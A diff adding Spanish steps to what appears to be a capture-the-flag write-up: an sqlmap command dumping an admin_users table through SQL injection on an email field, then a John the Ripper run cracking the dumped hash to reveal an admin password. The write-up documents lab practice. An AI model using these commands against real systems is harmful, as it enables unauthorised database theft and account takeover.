@@ -148,9 +148,26 @@ Database: usage_blog
 <contenido omitido>
 ```
 
+La base de datos admin_users nos llama la atención. Procedemos a su enumeración.
+```bash
+# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users --dump
+<contenido omitido>
+<contenido omitido>
+```
 <br>
 
 # Explotación y acceso
+Intentamos descrifrar el hash obtenido. Para ello, lo guardamos en un fichero llamado hash.txt y usamos la utilidad John the Ripper.
+```bash
+# john -w=/usr/share/wordlists/rockyou.txt hash.txt
+<contenido omitido>
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+whatever1        (?)    
+<contenido omitido>
+```
+
+Ahora que tenemos el usuario (admin) y la contraseña (whatever1), comprobaremos si son válidas para acceder al panel de administración.
 
 <br>
 
